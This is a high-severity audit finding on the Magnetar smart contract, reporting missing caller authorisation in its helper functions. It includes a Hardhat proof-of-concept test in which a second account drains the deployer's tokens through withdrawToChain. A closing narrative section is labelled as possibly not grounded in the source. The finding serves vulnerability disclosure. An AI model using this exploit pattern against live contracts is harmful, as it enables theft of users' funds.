---
id: 19089
severity: "High"
---

# Magnetar contract has no approval checking

## Description

The `Magnetar.sol` contract has a lot of useful helper function to carry out operations on user market positions. If a user wishes to use the helper functions, they have to first give approval to the Magnetar contract to manipulate their positions. As an example, for the big bang markets, this is done by calling the `updateOperator` function.

```solidity
function updateOperator(address operator, bool status) external {
    operators[msg.sender][operator] = status;
}
```

Since this is a helper function, we can expect users to give this approval in order to use these functions. However the issue is that any attacker can use these approvals to manipulate and drain positions of other users.

As an example, let us look at the `withdrawToChain` function. Lets assume an attacker is calling this function, and the victim’s address is passed in the `from` field. Assume the victim has given all approvals to the Magnetar contracts. The function delegates this to the `withdrawToChain` in the Market module.

In `withdrawToChain` function, there are no checks on the `msg.sender` address. The function interacts with yieldbox and does a crosschain send to the `receiver` address passed by the attacker.

```solidity
if (dstChainId == 0) {
    yieldBox.withdraw(
        assetId,
        from,
        LzLib.bytes32ToAddress(receiver),
        amount,
        share
    );
    return;
}

yieldBox.withdraw(assetId, from, address(this), amount, 0);

ISendFrom(address(asset)).sendFrom{value: gas}(
    address(this),
    dstChainId,
    receiver,
    amount,
    callParams
);
```

This sends the tokens to the `receiver` address either in the same chain or cross-chain. This lets any user steal tokens from any other user, exploiting the approval given to the magnetar address.

While this report only discusses the issue with this one function, the same issue is present for every function in the magnetar contract. This allows attackers to manipulate bigbang markets and singularity markets as well. Thus this is a high severity issue.

## Proof of Concept

A POC is developed by editing the test present in magnetar.test.ts. Only a single change is made to the test. The last `withdrawToChain` call is done from the `eoa1` address instead of the deployer address.

```solidity
it.only("should test withdrawTo", async () => {
    const {
        deployer,
        eoa1,
        yieldBox,
        createTokenEmptyStrategy,
        deployCurveStableToUsdoBidder,
        usd0,
        bar,
        __wethUsdcPrice,
        wethUsdcOracle,
        weth,
        wethAssetId,
        mediumRiskMC,
        usdc,
        magnetar,
        initContracts,
        timeTravel,
    } = await loadFixture(register)

    const usdoStratregy = await bar.emptyStrategies(usd0.address)
    const usdoAssetId = await yieldBox.ids(1, usd0.address, usdoStratregy, 0)

    //Deploy & set Singularity
    const SGLLiquidation = new SGLLiquidation__factory(deployer)
    const _sglLiquidationModule = await SGLLiquidation.deploy()

    const SGLCollateral = new SGLCollateral__factory(deployer)
    const _sglCollateralModule = await SGLCollateral.deploy()

    const SGLBorrow = new SGLBorrow__factory(deployer)
    const _sglBorrowModule = await SGLBorrow.deploy()

    const SGLLeverage = new SGLLeverage__factory(deployer)
    const _sglLeverageModule = await SGLLeverage.deploy()

    const newPrice = __wethUsdcPrice.div(1000000)
    await wethUsdcOracle.set(newPrice)

    const sglData = new ethers.utils.AbiCoder().encode(
        [
            "address",
            "address",
            "address",
            "address",
            "address",
            "address",
            "uint256",
            "address",
            "uint256",
            "address",
            "uint256",
        ],
        [
            _sglLiquidationModule.address,
            _sglBorrowModule.address,
            _sglCollateralModule.address,
            _sglLeverageModule.address,
            bar.address,
            usd0.address,
            usdoAssetId,
            weth.address,
            wethAssetId,
            wethUsdcOracle.address,
            ethers.utils.parseEther("1"),
        ]
    )
    await bar.registerSingularity(mediumRiskMC.address, sglData, true)
    const wethUsdoSingularity = new ethers.Contract(
        await bar.clonesOf(
            mediumRiskMC.address,
            (await bar.clonesOfCount(mediumRiskMC.address)).sub(1)
        ),
        SingularityArtifact.abi,
        ethers.provider
    ).connect(deployer)

    //Deploy & set LiquidationQueue
    await usd0.setMinterStatus(wethUsdoSingularity.address, true)
    await usd0.setBurnerStatus(wethUsdoSingularity.address, true)

    const LiquidationQueueFactory = await ethers.getContractFactory(
        "LiquidationQueue"
    )
    const liquidationQueue = await LiquidationQueueFactory.deploy()

    const feeCollector = new ethers.Wallet(
        ethers.Wallet.createRandom().privateKey,
        ethers.provider
    )

    const { stableToUsdoBidder } = await deployCurveStableToUsdoBidder(
        deployer,
        bar,
        usdc,
        usd0
    )

    const LQ_META = {
        activationTime: 600, // 10min
        minBidAmount: ethers.BigNumber.from((1e18).toString()).mul(200), // 200 USDC
        closeToMinBidAmount: ethers.BigNumber.from((1e18).toString()).mul(202),
        defaultBidAmount: ethers.BigNumber.from((1e18).toString()).mul(400), // 400 USDC
        feeCollector: feeCollector.address,
        bidExecutionSwapper: ethers.constants.AddressZero,
        usdoSwapper: stableToUsdoBidder.address,
    }
    await liquidationQueue.init(LQ_META, wethUsdoSingularity.address)

    const payload = wethUsdoSingularity.interface.encodeFunctionData(
        "setLiquidationQueueConfig",
        [
            liquidationQueue.address,
            ethers.constants.AddressZero,
            ethers.constants.AddressZero,
        ]
    )

    await (
        await bar.executeMarketFn(
            [wethUsdoSingularity.address],
            [payload],
            true
        )
    ).wait()

    const usdoAmount = ethers.BigNumber.from((1e18).toString()).mul(10)
    const usdoShare = await yieldBox.toShare(usdoAssetId, usdoAmount, false)
    await usd0.mint(deployer.address, usdoAmount)

    const depositAssetEncoded = yieldBox.interface.encodeFunctionData(
        "depositAsset",
        [usdoAssetId, deployer.address, deployer.address, 0, usdoShare]
    )

    const sglLendEncoded = wethUsdoSingularity.interface.encodeFunctionData(
        "addAsset",
        [deployer.address, deployer.address, false, usdoShare]
    )

    await usd0.approve(magnetar.address, ethers.constants.MaxUint256)
    await usd0.approve(yieldBox.address, ethers.constants.MaxUint256)
    await usd0.approve(wethUsdoSingularity.address, ethers.constants.MaxUint256)
    await yieldBox.setApprovalForAll(deployer.address, true)
    await yieldBox.setApprovalForAll(wethUsdoSingularity.address, true)
    await yieldBox.setApprovalForAll(magnetar.address, true)
    await weth.approve(yieldBox.address, ethers.constants.MaxUint256)
    await weth.approve(magnetar.address, ethers.constants.MaxUint256)
    await wethUsdoSingularity.approve(
        magnetar.address,
        ethers.constants.MaxUint256
    )
    const calls = [
        {
            id: 100,
            target: yieldBox.address,
            value: 0,
            allowFailure: false,
            call: depositAssetEncoded,
        },
        {
            id: 203,
            target: wethUsdoSingularity.address,
            value: 0,
            allowFailure: false,
            call: sglLendEncoded,
        },
    ]

    await magnetar.connect(deployer).burst(calls)

    const ybBalance = await yieldBox.balanceOf(deployer.address, usdoAssetId)
    expect(ybBalance.eq(0)).to.be.true

    const sglBalance = await wethUsdoSingularity.balanceOf(deployer.address)
    expect(sglBalance.gt(0)).to.be.true

    const borrowAmount = ethers.BigNumber.from((1e17).toString())
    await timeTravel(86401)
    const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(1)
    await weth.freeMint(wethMintVal)

    await wethUsdoSingularity
        .connect(deployer)
        .approveBorrow(magnetar.address, ethers.constants.MaxUint256)

    const borrowFn = magnetar.interface.encodeFunctionData(
        "depositAddCollateralAndBorrowFromMarket",
        [
            wethUsdoSingularity.address,
            deployer.address,
            wethMintVal,
            0,
            true,
            true,
            {
                withdraw: false,
                withdrawLzFeeAmount: 0,
                withdrawOnOtherChain: false,
                withdrawLzChainId: 0,
                withdrawAdapterParams: ethers.utils.toUtf8Bytes(""),
            },
        ]
    )

    let borrowPart = await wethUsdoSingularity.userBorrowPart(deployer.address)
    expect(borrowPart.eq(0)).to.be.true
    await magnetar.connect(deployer).burst(
        [
            {
                id: 206,
                target: magnetar.address,
                value: ethers.utils.parseEther("2"),
                allowFailure: false,
                call: borrowFn,
            },
        ],
        {
            value: ethers.utils.parseEther("2"),
        }
    )

    const collateralBalance = await wethUsdoSingularity.userCollateralShare(
        deployer.address
    )
    const collateralAmpunt = await yieldBox.toAmount(
        wethAssetId,
        collateralBalance,
        false
    )
    expect(collateralAmpunt.eq(wethMintVal)).to.be.true

    const totalAsset = await wethUsdoSingularity.totalSupply()

    await wethUsdoSingularity
        .connect(deployer)
        .borrow(deployer.address, deployer.address, borrowAmount)

    borrowPart = await wethUsdoSingularity.userBorrowPart(deployer.address)
    expect(borrowPart.gte(borrowAmount)).to.be.true

    const receiverSplit = deployer.address.split("0x")
    await magnetar
        .connect(eoa1)
        .withdrawToChain(
            yieldBox.address,
            deployer.address,
            usdoAssetId,
            0,
            "0x".concat(receiverSplit[1].padStart(64, "0")),
            borrowAmount,
            0,
            "0x00",
            deployer.address,
            0
        )

    const usdoBalanceOfDeployer = await usd0.balanceOf(deployer.address)
    expect(usdoBalanceOfDeployer.eq(borrowAmount)).to.be.true
})
```

This test passes, showing that the `eoa1` address is able to withdraw tokens belonging to the deployer.

## Recommendation

Add approval checks to all functions in the Magnetar contract.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The Magnetar contract provides a collection of helper functions that act on user market positions under the assumption that the user has previously granted the contract permission to manipulate their assets through an operator approval or token allowance. The core problem is that none of these helpers verify that the caller of the function is the approved operator or the token owner. As a result, any address that knows a victim’s address can invoke functions such as withdrawToChain and cause the contract to move the victim’s tokens to an arbitrary receiver chosen by the attacker. In the withdrawToChain implementation the contract forwards the call to the YieldBox withdraw function using the ‘from’ parameter supplied by the caller without checking that msg.sender matches the approved operator. When a victim has given Magnetar full approval, an attacker can specify the victim as the source address and any address as the destination, resulting in a direct transfer of the victim’s balance either on‑chain or across chains. This leads to a loss of funds for honest users, breaking the accounting guarantees of the market and effectively allowing token theft without any signature from the victim. The vulnerability appears whenever a user interacts with any Magnetar helper after having set operator approvals; it is not limited to a single function but is present in all helpers that accept a ‘from’ argument. The issue was discovered during a security audit by reviewing the access‑control logic of Magnetar and noticing the absence of msg.sender checks in functions that manipulate external token balances. Because the contract relies on external approvals, the problem can be subtle and may not be evident from normal UI behavior – the UI will still show a successful transaction, but the user’s balance becomes zero or reduced unexpectedly. This bug belongs to the class of missing authorization checks or unchecked external calls where a privileged operation is exposed to any caller. An attacker can exploit it by calling the helper with the victim’s address as the source and a controlled destination, effectively stealing the tokens. The recommended remediation is to enforce that only an address explicitly authorized by the user (for example, via the operators mapping) can invoke functions that move assets on the user’s behalf, or to require that the caller be the same as the ‘from’ address, and to add explicit approval verification in each helper. Adding proper access control restores the intended business logic that a user must explicitly trigger withdrawals of their own assets, preventing unauthorized draining of positions.
